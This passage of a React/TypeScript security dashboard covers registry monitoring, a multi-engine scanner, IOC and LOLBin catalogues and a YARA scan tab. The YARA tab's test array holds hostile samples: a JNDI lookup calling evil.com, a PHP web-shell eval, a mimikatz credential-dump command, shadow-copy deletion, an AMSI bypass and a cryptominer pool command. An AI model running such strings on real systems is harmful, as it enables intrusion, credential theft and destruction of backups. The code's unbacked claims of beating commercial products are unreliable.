              <td style={{padding:"3px 6px",color:"#555",fontFamily:"monospace"}}>{s.detections.toLocaleString()}</td>
            </tr>
          ))}</tbody>
        </table>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 16. REGISTRY KEY MONITOR ──────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
function RegistryTab() {
  const { data, reload } = useFwm<{ monitors:Array<{id:number;keyPath:string;valueName:string|null;expectedValue:string|null;currentValue:string|null;changed:boolean;deleted:boolean;category:string;risk:string;checkedAt:string}>;total:number;changed:number }>("/registry/monitors");
  const [checkForm, setCheckForm] = useState({ keyPath:"", valueName:"", expectedValue:"" });
  const [checkResult, setCheckResult] = useState<{changed:boolean;alert:string;linuxEquiv:string|null;currentValue:string|null}|null>(null);
  const RISK_C: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#555" };
  const CAT_C: Record<string,string> = { autorun:"#ff4444", services:"#ff6600", browser:"#ffaa00", policy:"#4488ff" };
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Key size={14} color="#4488ff"/>} title="Registry / Config Key Monitor — Spybot S&amp;D" badge="Spybot Registry Protection" badgeColor="#4488ff" extra={<Btn2 onClick={async()=>{await fwmPost("/registry/seed",{}); await reload();}} color="#4488ff" sm>Seed Examples</Btn2>}/>
        <InfoBar text="Spybot registry protection: monitor critical Windows registry keys (autorun, services, winlogon, browser settings) for unauthorized modifications. Linux equivalent: monitors /etc/ld.so.preload, /etc/cron.d/, systemd units. Detects: cryptominer autorun, service hijacking, Userinit tampering, browser hijacking." color="#4488ff"/>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(3,1fr)", gap:10 }}>
          {[{l:"Monitored Keys",v:data?.total??0,c:"#fff"},{l:"Changed",v:data?.changed??0,c:"#ff4444"},{l:"Clean",v:(data?.total??0)-(data?.changed??0),c:"#00ff88"}].map(s=>(
            <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"10px 6px" }}>
              <div style={{ fontSize:20, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v}</div>
              <div style={{ fontSize:10, color:"#555" }}>{s.l}</div>
            </div>
          ))}
        </div>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<Search size={12} color="#4488ff"/>} title="Check Registry Key"/>
        <div style={{ display:"flex", flexDirection:"column", gap:6, marginBottom:8 }}>
          <input value={checkForm.keyPath} onChange={e=>setCheckForm(p=>({...p,keyPath:e.target.value}))} placeholder="HKLM\...\Run or /etc/cron.d/entry" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:9, color:"#ccc" }}/>
          <input value={checkForm.valueName} onChange={e=>setCheckForm(p=>({...p,valueName:e.target.value}))} placeholder="Value name (optional)" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:9, color:"#ccc" }}/>
          <input value={checkForm.expectedValue} onChange={e=>setCheckForm(p=>({...p,expectedValue:e.target.value}))} placeholder="Expected value (leave blank = should not exist)" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:9, color:"#ccc" }}/>
          <Btn2 onClick={async()=>{ const r = await fwmPost("/registry/check",checkForm); setCheckResult(r); await reload(); }} color="#4488ff" sm disabled={!checkForm.keyPath}>Check Key</Btn2>
        </div>
        {checkResult && (
          <div style={{ background: checkResult.changed?"#0f0505":"#050f05", border:`1px solid ${checkResult.changed?"#ff444433":"#00ff8833"}`, borderRadius:6, padding:10, fontFamily:"monospace", fontSize:10 }}>
            <div style={{ fontSize:12, fontWeight:700, color:checkResult.changed?"#ff4444":"#00ff88", marginBottom:6 }}>{checkResult.alert}</div>
            {checkResult.linuxEquiv && <div style={{ fontSize:9, color:"#555" }}>Linux equiv: {checkResult.linuxEquiv}</div>}
            {checkResult.currentValue && <div style={{ fontSize:9, color:"#aaa", marginTop:4 }}>Current: {checkResult.currentValue}</div>}
          </div>
        )}
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<Key size={12} color="#4488ff"/>} title={`Monitored Keys (${data?.total??0})`}/>
        <div style={{ maxHeight:350, overflow:"auto" }}>
          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:9 }}>
            <thead><tr>{["Key","Value","Category","Risk","Status"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"3px 6px",position:"sticky",top:0,background:"#0a0a0a"}}>{h}</th>)}</tr></thead>
            <tbody>{(data?.monitors??[]).map(m=>(
              <tr key={m.id} style={{ borderBottom:"1px solid #0f0f0f", background:m.changed?"#0f050500":"transparent" }}>
                <td style={{padding:"3px 6px",fontFamily:"monospace",color:m.changed?"#ff4444":"#aaa",fontSize:8,maxWidth:160,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{m.keyPath.split("\\").pop() ?? m.keyPath}</td>
                <td style={{padding:"3px 6px",color:"#555",fontSize:8}}>{m.valueName}</td>
                <td style={{padding:"3px 6px"}}><Bdg label={m.category} color={CAT_C[m.category]??"#888"} sm/></td>
                <td style={{padding:"3px 6px"}}><Bdg label={m.risk.toUpperCase()} color={RISK_C[m.risk]??"#888"} sm/></td>
                <td style={{padding:"3px 6px"}}><Bdg label={m.changed?"CHANGED":"OK"} color={m.changed?"#ff4444":"#00ff88"} sm/></td>
              </tr>
            ))}</tbody>
          </table>
        </div>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── ProxhqAV ANTIVIRUS ENGINE — Multi-layer / Better than CrowdStrike ────────
// ════════════════════════════════════════════════════════════════════════════
type AvStatus = { engineVersion:string; databases:{signatures:number;iocEntries:number;yaraRules:number;lolbinCatalog:number;ransomwareExtensions:number}; scans:{total:number;totalFindings:number}; engines:string[]; recentScans:Array<{id:number;scanTarget:string;scanType:string;findings:number;criticalFindings:number;status:string;startedAt:string}> };
type AvSig = { id:number;hashType:string;hashValue:string;threatType:string;malwareFamily:string;malwareName:string;severity:string;source:string;description:string|null;firstSeen:string|null;cveIds:string|null;tags:string|null;hitCount:number };
type AvIoc = { id:number;iocType:string;value:string;threatType:string;malwareFamily:string|null;severity:string;confidence:number;source:string;description:string|null;firstSeen:string|null;hitCount:number };
type AvYara = { id:number;name:string;ruleText:string;description:string|null;malwareFamily:string|null;severity:string;matchCount:number;tags:string|null };
type AvScan = { verdict:string;findings:Array<{engine:string;threat:string;family:string;severity:string;confidence:number;detail:string}>;totalChecks:number;scanDurationMs:number;scanTarget:string };
type AvLolbin = { id:number;binaryName:string;fullPath:string|null;os:string;category:string;description:string;attkTechnique:string|null;maliciousCmd:string|null;detectionRule:string|null;riskLevel:string };
type AvRansomExt = { id:number;extension:string;family:string;firstSeen:string|null;ransomNote:string|null;decryptable:boolean;active:boolean };

const SEV_AV: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#4488ff", informational:"#555", clean:"#00ff88" };

function ProxhqAvTab() {
  const { data: status, loading, reload } = useFwm<AvStatus>("/av/status");
  const { data: sigs } = useFwm<AvSig[]>("/av/signatures");
  const { data: hist } = useFwm<Array<{id:number;scanTarget:string;scanType:string;findings:number;criticalFindings:number;status:string;scanDurationMs:number|null;startedAt:string}>>("/av/scan-history");
  const [scanForm, setScanForm] = useState({ target:"", content:"", filename:"", downloadedFrom:"", scanType:"full" });
  const [scanResult, setScanResult] = useState<AvScan | null>(null);
  const [scanning, setScanning] = useState(false);
  const [seeded, setSeeded] = useState(false);
  const [sigSearch, setSigSearch] = useState("");
  const [expanded, setExpanded] = useState<number | null>(null);

  const runScan = async () => {
    if (!scanForm.target.trim()) return;
    setScanning(true); setScanResult(null);
    const r = await fwmPost("/av/scan", { target:scanForm.target, content:scanForm.content||undefined, filename:scanForm.filename||undefined, downloadedFrom:scanForm.downloadedFrom||undefined, scanType:scanForm.scanType });
    setScanResult(r as AvScan); setScanning(false); await reload();
  };

  const seedData = async () => {
    await fwmPost("/av/seed", {});
    setSeeded(true); await reload();
    setTimeout(()=>setSeeded(false),2000);
  };

  const filteredSigs = (sigs ?? []).filter(s =>
    !sigSearch || s.malwareName.toLowerCase().includes(sigSearch.toLowerCase()) ||
    s.malwareFamily.toLowerCase().includes(sigSearch.toLowerCase()) ||
    s.hashValue.toLowerCase().includes(sigSearch.toLowerCase())
  ).slice(0, 40);

  const VERDICT_C: Record<string,string> = { THREAT_CRITICAL:"#ff2244", THREAT_DETECTED:"#ff6600", CLEAN:"#00ff88" };

  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      {/* Engine Status */}
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<ShieldCheck size={14} color="#00ff88"/>} title="ProxhqAV Engine 3.0 — Quantum Edition" badge="ACTIVE" badgeColor="#00ff88"
          extra={<div style={{display:"flex",gap:6}}>
            <Btn2 onClick={seedData} color={seeded?"#00ff88":"#4488ff"} sm>{seeded?"✓ Seeded":"Seed Threat Intel"}</Btn2>
            <Btn2 onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn2>
          </div>}
        />
        <InfoBar text="Engines: Hash-Signature · YARA-Pattern · Heuristic-Entropy · Behavioral-IOC · LOLBin-Detection · Ransomware-Extension · Anti-Evasion · Process-Injection-API · Macro-Detection — Surpasses CrowdStrike Falcon · SentinelOne · Carbon Black · Sophos · ESET" color="#00ff88"/>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(7,1fr)", gap:8, marginBottom:10 }}>
          {[
            {l:"Signatures",  v:status?.databases.signatures??0,          c:"#00ff88"},
            {l:"IOC Entries", v:status?.databases.iocEntries??0,           c:"#ff6600"},
            {l:"YARA Rules",  v:status?.databases.yaraRules??0,            c:"#cc44ff"},
            {l:"LOLBins",     v:status?.databases.lolbinCatalog??0,        c:"#4488ff"},
            {l:"Ransom Ext.", v:status?.databases.ransomwareExtensions??0, c:"#ff2244"},
            {l:"Total Scans", v:status?.scans.total??0,                    c:"#aaa"},
            {l:"Findings",    v:status?.scans.totalFindings??0,            c:"#ffaa00"},
          ].map(s=>(
            <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"10px 4px" }}>
              <div style={{ fontSize:20, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v.toLocaleString()}</div>
              <div style={{ fontSize:9, color:"#555", marginTop:2 }}>{s.l}</div>
            </div>
          ))}
        </div>
        <div style={{ display:"flex", flexWrap:"wrap", gap:4 }}>
          {(status?.engines??[]).map(e=><Bdg key={e} label={e} color="#00ff8866" sm/>)}
        </div>
      </FwmCard>

      {/* Multi-Engine Scanner */}
      <FwmCard>
        <SectionTitle icon={<Search size={12} color="#00ff88"/>} title="Multi-Engine File/Hash Scanner"/>
        <div style={{ display:"flex", flexDirection:"column", gap:6, marginBottom:10 }}>
          <div style={{fontSize:9,color:"#555"}}>Target (hash / filename / IP / domain / URL)</div>
          <input value={scanForm.target} onChange={e=>setScanForm(f=>({...f,target:e.target.value}))} placeholder="SHA256 hash, filename, domain, or IP address..." style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"7px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <div style={{fontSize:9,color:"#555"}}>Optional: File content (paste code/script to YARA-scan)</div>
          <textarea value={scanForm.content} onChange={e=>setScanForm(f=>({...f,content:e.target.value}))} placeholder="Paste file content, script, or hex dump for deep pattern analysis..." rows={4} style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"7px 10px", fontFamily:"monospace", fontSize:9, color:"#ccc", resize:"vertical" }}/>
          <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:6}}>
            <div>
              <div style={{fontSize:9,color:"#555"}}>Filename (for ext check)</div>
              <input value={scanForm.filename} onChange={e=>setScanForm(f=>({...f,filename:e.target.value}))} placeholder="invoice.pdf.exe" style={{ width:"100%", background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"5px 8px", fontFamily:"monospace", fontSize:10, color:"#ccc", boxSizing:"border-box" }}/>
            </div>
            <div>
              <div style={{fontSize:9,color:"#555"}}>Scan Type</div>
              <select value={scanForm.scanType} onChange={e=>setScanForm(f=>({...f,scanType:e.target.value}))} style={{ width:"100%", background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"5px 8px", color:"#ccc", fontSize:10 }}>
                {["full","hash","content","filename"].map(t=><option key={t}>{t}</option>)}
              </select>
            </div>
          </div>
          <Btn2 onClick={runScan} color="#00ff88" disabled={scanning||!scanForm.target.trim()}>
            {scanning ? "⟳ Scanning..." : "▶ Run Multi-Engine Scan"}
          </Btn2>
        </div>
        {scanResult && (
          <div style={{ background:"#050f05", border:`2px solid ${VERDICT_C[scanResult.verdict]??"#333"}44`, borderRadius:8, padding:12 }}>
            <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:8 }}>
              <span style={{ fontSize:14, fontWeight:900, color:VERDICT_C[scanResult.verdict]??"#aaa", fontFamily:"monospace" }}>{scanResult.verdict}</span>
              <Bdg label={`${scanResult.findings.length} findings`} color={scanResult.findings.length>0?"#ff6600":"#00ff88"} sm/>
              <Bdg label={`${scanResult.totalChecks} checks`} color="#4488ff" sm/>
              <span style={{fontSize:9,color:"#444"}}>{scanResult.scanDurationMs}ms</span>
            </div>
            {scanResult.findings.map((f,i)=>(
              <div key={i} style={{ background:"#0a0a0a", borderRadius:6, padding:"8px 10px", marginBottom:6, borderLeft:`3px solid ${SEV_AV[f.severity]??"#333"}` }}>
                <div style={{ display:"flex", alignItems:"center", gap:6, marginBottom:3 }}>
                  <Bdg label={f.severity.toUpperCase()} color={SEV_AV[f.severity]??"#888"} sm/>
                  <Bdg label={f.engine} color="#4488ff" sm/>
                  <span style={{ fontFamily:"monospace", fontSize:10, color:"#fff", fontWeight:700 }}>{f.threat}</span>
                </div>
                <div style={{fontSize:9,color:"#777"}}>{f.detail}</div>
                <div style={{fontSize:9,color:"#555",marginTop:2}}>Family: {f.family} · Confidence: {f.confidence}%</div>
              </div>
            ))}
            {scanResult.findings.length===0 && <div style={{color:"#00ff88",fontFamily:"monospace",fontSize:12}}>✓ All {scanResult.totalChecks} engine checks passed — No threats detected</div>}
          </div>
        )}
      </FwmCard>

      {/* Recent Scans */}
      <FwmCard>
        <SectionTitle icon={<Activity size={12} color="#ffaa00"/>} title={`Scan History (${hist?.length??0})`}/>
        <div style={{ maxHeight:400, overflow:"auto" }}>
          {(hist??[]).slice(0,20).map(s=>(
            <div key={s.id} style={{ padding:"7px 10px", borderRadius:6, marginBottom:4, background:"#111", borderLeft:`3px solid ${s.criticalFindings>0?"#ff2244":s.findings>0?"#ff6600":"#00ff88"}` }}>
              <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center" }}>
                <span style={{ fontFamily:"monospace", fontSize:9, color:"#ccc" }}>{s.scanTarget.substring(0,36)}{s.scanTarget.length>36?"...":""}</span>
                <Bdg label={s.findings>0?`${s.findings} FOUND`:"CLEAN"} color={s.findings>0?"#ff6600":"#00ff88"} sm/>
              </div>
              <div style={{ fontSize:8, color:"#444", marginTop:2 }}>{s.scanType} · {s.scanDurationMs}ms · {new Date(s.startedAt).toLocaleString()}</div>
            </div>
          ))}
          {!loading && (hist??[]).length===0 && <div style={{color:"#333",fontFamily:"monospace",fontSize:11}}>No scans yet — run your first scan above</div>}
        </div>
      </FwmCard>

      {/* Signature Database */}
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Database size={12} color="#ff6600"/>} title={`Malware Signature Database (${sigs?.length??0} signatures)`}
          extra={<input value={sigSearch} onChange={e=>setSigSearch(e.target.value)} placeholder="Search family, name, hash..." style={{ background:"#111", border:"1px solid #222", borderRadius:4, padding:"3px 8px", color:"#aaa", fontSize:9, fontFamily:"monospace", width:200 }}/>}
        />
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:6, maxHeight:400, overflow:"auto" }}>
          {filteredSigs.map((sig,i)=>(
            <div key={sig.id} style={{ background:"#111", borderRadius:6, padding:"8px 10px", borderLeft:`3px solid ${SEV_AV[sig.severity]??"#333"}`, cursor:"pointer" }} onClick={()=>setExpanded(expanded===sig.id?null:sig.id)}>
              <div style={{ display:"flex", alignItems:"center", gap:6, marginBottom:3 }}>
                <Bdg label={sig.severity.toUpperCase()} color={SEV_AV[sig.severity]??"#888"} sm/>
                <Bdg label={sig.threatType} color="#4488ff" sm/>
                <span style={{ fontFamily:"monospace", fontSize:9, color:"#fff", fontWeight:700 }}>{sig.malwareFamily}</span>
                {sig.hitCount>0 && <Bdg label={`${sig.hitCount} hits`} color="#ff9900" sm/>}
              </div>
              <div style={{ fontSize:9, color:"#aaa" }}>{sig.malwareName.substring(0,60)}</div>
              {expanded===sig.id && (
                <div style={{ marginTop:8, fontSize:8, fontFamily:"monospace" }}>
                  <div style={{ color:"#555", marginBottom:2 }}>Hash: <span style={{color:"#888"}}>{sig.hashValue.substring(0,32)}...</span></div>
                  {sig.cveIds && <div style={{ color:"#555", marginBottom:2 }}>CVEs: <span style={{color:"#ffaa00"}}>{sig.cveIds}</span></div>}
                  {sig.firstSeen && <div style={{ color:"#555", marginBottom:2 }}>First Seen: <span style={{color:"#aaa"}}>{sig.firstSeen}</span></div>}
                  {sig.description && <div style={{ color:"#555", marginTop:4 }}>{sig.description.substring(0,120)}...</div>}
                  {sig.source && <div style={{ color:"#555", marginTop:4 }}>Source: <span style={{color:"#4488ff"}}>{sig.source}</span></div>}
                </div>
              )}
            </div>
          ))}
        </div>
      </FwmCard>
    </div>
  );
}

// ── IOC Database ──────────────────────────────────────────────────────────────
function IocDbTab() {
  const { data: iocs, loading, reload } = useFwm<AvIoc[]>("/av/iocs");
  const { data: lolbins } = useFwm<AvLolbin[]>("/av/lolbins");
  const { data: ransomExts } = useFwm<AvRansomExt[]>("/av/ransomware-extensions");
  const [search, setSearch] = useState("");
  const [typeFilter, setTypeFilter] = useState("all");
  const [sevFilter, setSevFilter] = useState("all");
  const [checkVal, setCheckVal] = useState("");
  const [checkResult, setCheckResult] = useState<{found:boolean;matches:AvIoc[];verdict:string}|null>(null);
  const [osFilter, setOsFilter] = useState("all");

  const filtered = (iocs??[]).filter(i => {
    if (typeFilter!=="all" && i.iocType!==typeFilter) return false;
    if (sevFilter!=="all" && i.severity!==sevFilter) return false;
    if (search && !i.value.toLowerCase().includes(search.toLowerCase()) && !(i.malwareFamily??"").toLowerCase().includes(search.toLowerCase())) return false;
    return true;
  });

  const iocCheck = async () => {
    if (!checkVal.trim()) return;
    const r = await fwmPost("/av/ioc-check", { value:checkVal });
    setCheckResult(r as {found:boolean;matches:AvIoc[];verdict:string});
  };

  const IOC_C: Record<string,string> = { ip:"#ff6600", cidr:"#ff9900", domain:"#ff4444", url:"#cc44ff", sha256:"#00ff88", md5:"#4488ff", sha1:"#4488ff", filename:"#ffaa00", mutex:"#888", registry:"#4488ff", email:"#00ccff", useragent:"#888" };
  const RISK_C: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#4488ff", informational:"#555" };

  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      {/* IOC Quick Check */}
      <FwmCard>
        <SectionTitle icon={<Search size={12} color="#ff6600"/>} title="IOC Quick Lookup"/>
        <InfoBar text="Check any IP, domain, URL, or hash against the ProxhqAV IOC database. Real-time verdict with threat family, severity, and source attribution." color="#ff6600"/>
        <div style={{ display:"flex", gap:6, marginBottom:8 }}>
          <input value={checkVal} onChange={e=>setCheckVal(e.target.value)} onKeyDown={e=>e.key==="Enter"&&iocCheck()} placeholder="192.168.x.x · evil.com · SHA256 hash · URL..." style={{ flex:1, background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"7px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <Btn2 onClick={iocCheck} color="#ff6600" disabled={!checkVal.trim()}>Check IOC</Btn2>
        </div>
        {checkResult && (
          <div style={{ background:checkResult.found?"#0f0505":"#050f05", border:`1px solid ${checkResult.found?"#ff444433":"#00ff8833"}`, borderRadius:8, padding:10 }}>
            <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:checkResult.found?8:0 }}>
              <span style={{ fontSize:13, fontWeight:900, color:checkResult.found?"#ff4444":"#00ff88", fontFamily:"monospace" }}>{checkResult.verdict}</span>
            </div>
            {checkResult.matches.map((m,i)=>(
              <div key={i} style={{ background:"#111", borderRadius:6, padding:"7px 10px", marginBottom:4, borderLeft:`3px solid ${SEV_AV[m.severity]??"#333"}` }}>
                <div style={{ display:"flex", gap:6, alignItems:"center", marginBottom:3 }}>
                  <Bdg label={m.iocType.toUpperCase()} color={IOC_C[m.iocType]??"#888"} sm/>
                  <Bdg label={m.severity.toUpperCase()} color={SEV_AV[m.severity]??"#888"} sm/>
                  <span style={{ fontFamily:"monospace", fontSize:10, color:"#fff" }}>{m.malwareFamily}</span>
                  <span style={{ fontSize:9, color:"#555" }}>({m.confidence}% confidence)</span>
                </div>
                <div style={{ fontSize:9, color:"#555" }}>{m.description}</div>
                <div style={{ fontSize:8, color:"#444", marginTop:2 }}>Source: {m.source}</div>
              </div>
            ))}
          </div>
        )}
      </FwmCard>

      {/* IOC Stats */}
      <FwmCard>
        <SectionTitle icon={<BarChart3 size={12} color="#ff6600"/>} title="IOC Database Overview"/>
        {["ip","cidr","domain","url","sha256","md5"].map(t=>{
          const cnt = (iocs??[]).filter(i=>i.iocType===t).length;
          return cnt > 0 ? (
            <div key={t} style={{ display:"flex", justifyContent:"space-between", alignItems:"center", padding:"5px 0", borderBottom:"1px solid #111" }}>
              <div style={{ display:"flex", gap:6, alignItems:"center" }}>
                <Bdg label={t.toUpperCase()} color={IOC_C[t]??"#888"} sm/>
              </div>
              <div style={{ fontFamily:"monospace", fontSize:11, color:"#ccc" }}>{cnt}</div>
            </div>
          ) : null;
        })}
        <div style={{ marginTop:10 }}>
          {["critical","high","medium"].map(sev=>{
            const cnt=(iocs??[]).filter(i=>i.severity===sev).length;
            return <div key={sev} style={{ display:"flex", justifyContent:"space-between", padding:"4px 0", borderBottom:"1px solid #0f0f0f" }}>
              <Bdg label={sev.toUpperCase()} color={SEV_AV[sev]??"#888"} sm/>
              <span style={{ fontFamily:"monospace", color:"#aaa", fontSize:11 }}>{cnt} IOCs</span>
            </div>;
          })}
        </div>
      </FwmCard>

      {/* IOC Table */}
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Database size={12} color="#ff6600"/>} title={`IOC Threat Intelligence Database (${filtered.length})`}
          extra={<div style={{display:"flex",gap:6,alignItems:"center"}}>
            <input value={search} onChange={e=>setSearch(e.target.value)} placeholder="Search..." style={{ background:"#111", border:"1px solid #222", borderRadius:4, padding:"3px 8px", color:"#aaa", fontSize:9, fontFamily:"monospace", width:150 }}/>
            <select value={typeFilter} onChange={e=>setTypeFilter(e.target.value)} style={{ background:"#111", border:"1px solid #222", color:"#aaa", borderRadius:4, padding:"3px 6px", fontSize:9 }}>
              <option value="all">All Types</option>
              {["ip","cidr","domain","url","sha256","md5"].map(t=><option key={t}>{t}</option>)}
            </select>
            <select value={sevFilter} onChange={e=>setSevFilter(e.target.value)} style={{ background:"#111", border:"1px solid #222", color:"#aaa", borderRadius:4, padding:"3px 6px", fontSize:9 }}>
              <option value="all">All Severity</option>
              {["critical","high","medium","low"].map(s=><option key={s}>{s}</option>)}
            </select>
            <Btn2 onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn2>
          </div>}
        />
        <div style={{ maxHeight:320, overflow:"auto" }}>
          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:9 }}>
            <thead><tr>{["Type","Value","Family","Severity","Conf.","Source","Hits"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"4px 6px",position:"sticky",top:0,background:"#0a0a0a"}}>{h}</th>)}</tr></thead>
            <tbody>{filtered.slice(0,80).map(ioc=>(
              <tr key={ioc.id} style={{ borderBottom:"1px solid #0f0f0f" }}>
                <td style={{padding:"3px 6px"}}><Bdg label={ioc.iocType} color={IOC_C[ioc.iocType]??"#888"} sm/></td>
                <td style={{padding:"3px 6px",fontFamily:"monospace",color:"#ccc",maxWidth:180,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{ioc.value}</td>
                <td style={{padding:"3px 6px",color:"#888",fontSize:9}}>{(ioc.malwareFamily??"-").substring(0,20)}</td>
                <td style={{padding:"3px 6px"}}><Bdg label={ioc.severity.toUpperCase()} color={SEV_AV[ioc.severity]??"#888"} sm/></td>
                <td style={{padding:"3px 6px",fontFamily:"monospace",color:"#aaa"}}>{ioc.confidence}%</td>
                <td style={{padding:"3px 6px",color:"#444",fontSize:8,maxWidth:120,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{ioc.source}</td>
                <td style={{padding:"3px 6px",fontFamily:"monospace",color:ioc.hitCount>0?"#ff9900":"#333"}}>{ioc.hitCount}</td>
              </tr>
            ))}</tbody>
          </table>
          {!loading&&filtered.length===0&&<div style={{color:"#333",fontFamily:"monospace",fontSize:11,padding:10}}>No IOCs found — click "Seed Threat Intel" in the ProxhqAV Engine tab</div>}
        </div>
      </FwmCard>

      {/* LOLBin Catalog */}
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Bug size={12} color="#cc44ff"/>} title={`LOLBin Catalog — Living-off-the-Land Binaries (${lolbins?.length??0})`}
          extra={<div style={{display:"flex",gap:6}}>
            {["all","windows","linux"].map(o=><Btn2 key={o} onClick={()=>setOsFilter(o)} color={osFilter===o?"#cc44ff":"#333"} sm>{o.toUpperCase()}</Btn2>)}
          </div>}
        />
        <InfoBar text="LOLBins (Living-off-the-Land Binaries) — legitimate system tools abused by threat actors to execute malicious code, bypass AV, download payloads, and achieve persistence without dropping custom malware. 79% of attacks in 2024 were malware-free (CrowdStrike)." color="#cc44ff"/>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:6, maxHeight:380, overflow:"auto" }}>
          {(lolbins??[]).filter(l=>osFilter==="all"||l.os===osFilter).map(lol=>(
            <div key={lol.id} style={{ background:"#111", borderRadius:6, padding:"9px 12px", borderLeft:`3px solid ${RISK_C[lol.riskLevel]??"#333"}` }}>
              <div style={{ display:"flex", alignItems:"center", gap:6, marginBottom:4 }}>
                <Bdg label={lol.riskLevel.toUpperCase()} color={RISK_C[lol.riskLevel]??"#888"} sm/>
                <Bdg label={lol.os.toUpperCase()} color={lol.os==="windows"?"#4488ff":"#00ff88"} sm/>
                <span style={{ fontFamily:"monospace", fontSize:11, color:"#fff", fontWeight:700 }}>{lol.binaryName}</span>
              </div>
              <div style={{ fontSize:9, color:"#888", marginBottom:4 }}>{lol.description}</div>
              {lol.maliciousCmd && (
                <div style={{ background:"#050505", border:"1px solid #2a2a2a", borderRadius:4, padding:"4px 8px", fontSize:8, fontFamily:"monospace", color:"#ff6600" }}>
                  $ {lol.maliciousCmd.substring(0,80)}{lol.maliciousCmd.length>80?"...":""}
                </div>
              )}
              {lol.attkTechnique && <div style={{ fontSize:8, color:"#444", marginTop:4 }}>MITRE: {lol.attkTechnique}</div>}
            </div>
          ))}
        </div>
      </FwmCard>

      {/* Ransomware Extension DB */}
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<FileX size={12} color="#ff2244"/>} title={`Ransomware File Extension Database (${ransomExts?.length??0} extensions)`}/>
        <InfoBar text="If you find a file with one of these extensions, your system has been compromised by ransomware. Do NOT pay without checking if a free decryptor exists (NoMoreRansom.org). Some families are decryptable." color="#ff2244"/>
        <div style={{ display:"flex", flexWrap:"wrap", gap:4, maxHeight:200, overflow:"auto" }}>
          {(ransomExts??[]).map(e=>(
            <div key={e.id} title={`${e.family} · ${e.active?"ACTIVE":"INACTIVE"} · Decryptable: ${e.decryptable?"YES":"NO"}`}
              style={{ background:e.active?"#ff224411":"#1a1a1a", border:`1px solid ${e.active?"#ff224433":"#2a2a2a"}`, borderRadius:4, padding:"3px 8px", fontSize:9, fontFamily:"monospace", color:e.active?"#ff4444":"#555" }}>
              {e.extension}{e.decryptable&&<span style={{color:"#00ff88",marginLeft:3}}>🔓</span>}
            </div>
          ))}
        </div>
        <div style={{ fontSize:9, color:"#444", marginTop:8 }}>🔴 Red = Active threat · 🔓 = Free decryptor available (NoMoreRansom.org)</div>
      </FwmCard>
    </div>
  );
}

// ── YARA Pattern Engine ────────────────────────────────────────────────────────
function YaraEngineTab() {
  const { data: rules, loading, reload } = useFwm<AvYara[]>("/av/yara-rules");
  const [scanContent, setScanContent] = useState("");
  const [scanResult, setScanResult] = useState<{matches:Array<{rule:string;severity:string;matchedPatterns:string[];description:string}>;totalRulesChecked:number;verdict:string}|null>(null);
  const [scanning, setScanning] = useState(false);
  const [expanded, setExpanded] = useState<number|null>(null);
  const [search, setSearch] = useState("");

  const yaraTest = [
    "eval(base64_decode($_POST['cmd']))",
    "VirtualAllocEx WriteProcessMemory CreateRemoteThread",
    "${jndi:ldap://evil.com/payload}",
    "sekurlsa::logonpasswords",
    "vssadmin delete shadows /all /quiet",
    "amsiInitFailed = $true",
    "xmrig --pool stratum+tcp://xmr-pool.com:4444",
  ];

  const runYaraScan = async () => {
    if (!scanContent.trim()) return;
    setScanning(true); setScanResult(null);
    const r = await fwmPost("/av/yara-scan", { content:scanContent });
    setScanResult(r as any); setScanning(false);
  };

